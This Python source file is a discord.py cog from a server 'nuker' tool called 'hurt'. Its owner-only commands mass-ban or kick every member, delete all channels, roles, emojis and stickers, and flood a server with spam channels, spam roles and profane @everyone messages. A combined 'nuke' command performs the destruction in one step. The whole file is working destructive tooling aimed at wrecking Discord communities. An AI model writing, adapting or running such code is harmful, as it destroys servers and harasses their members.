from discord.ext import commands

class owner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    
    @commands.command()
    @commands.is_owner()
    async def say(self, ctx: commands.Context, content:str):
        await ctx.send(f"{content}")
        
    @commands.command()
    @commands.is_owner()
    async def banall(self, ctx: commands.Context):
        for m in ctx.guild.members:
            try: await m.ban(reason=f'get fucked by {ctx.author}')
            except: continue
    
    @commands.command()        
    @commands.is_owner()
    async def kickall(self, ctx: commands.Context):
        for m in ctx.guild.members:
            try: await m.kick(reason=f'get fucked by {ctx.author}')
            except: continue
    
    @commands.command()        
    @commands.is_owner()
    async def deletechannels(self, ctx: commands.Context):
        for c in ctx.guild.channels:
            try: await c.delete(reason=f'get fucked by {ctx.author}')
            except: continue
    
    @commands.command()
    @commands.is_owner()
    async def deleteroles(self, ctx: commands.Context):
        for r in ctx.guild.roles:
            try: await r.delete(reason=f'get fucked by {ctx.author}')
            except: continue
            
    @commands.command()
    @commands.is_owner()
    async def deleteemojis(self, ctx: commands.Context):
        for e in ctx.guild.emojis:
            try: await e.delete(reason=f'get fucked by {ctx.author}')
            except: continue
            
    @commands.command()
    @commands.is_owner()
    async def deletestickers(self, ctx: commands.Context):
        for s in ctx.guild.stickers:
            try: await s.delete(reason=f'get fucked by {ctx.author}')
            except: continue
            
    @commands.command()
    @commands.is_owner()
    async def nuke(self, ctx: commands.Context):
        
        for m in ctx.guild.members:
            try: await m.ban()
            except: continue
            
        for c in ctx.guild.channels:
            try: await c.delete()
            except: continue
            
        for r in ctx.guild.roles:
            try: await r.delete()
            except: continue
            
        for e in ctx.guild.emojis:
            try: await e.delete()
            except: continue
            
        for s in ctx.guild.stickers():
            try: await s.delete()
            except: continue
            
    @commands.command()
    @commands.is_owner()
    async def channelspam(self, ctx: commands.Context, num=25, *, name="hurt nuker"):
        for i in range(num):
            try: await ctx.guild.create_text_channel(name=name)
            except: print("I do not have the manage_channels permission to make channels.")
            
    @commands.command()
    @commands.is_owner()
    async def rolespam(self, ctx: commands.Context, num=250, *, name="hurt nuker"):
        for i in range(num):
            try: await ctx.guild.create_role(name=name)
            except: print("I do not have the manage_roles permission to make roles.")
            
    @commands.command()
    @commands.is_owner()
    async def spamall(self, ctx: commands.Context, num=300, *, text="@everyone get fucked by [hurt](<https://github.com/sheslitforme/hurt>)"):
        for i in range(num):
            for c in ctx.guild.channels:
                try: await c.send(text)
                except: print("I do not have the send_messages permission to spam.")
                
    @commands.command()
    @commands.is_owner()
    async def spam(self, ctx: commands.Context, num=300, *, text="@everyone get fucked by [hurt](<https://github.com/sheslitforme/hurt>)"):
        for i in range(num):
            try: await ctx.channel.send(text)
            except: print("I do not have the send_messages permission to spam.")
            
async def setup(bot):
    await bot.add_cog(owner(bot))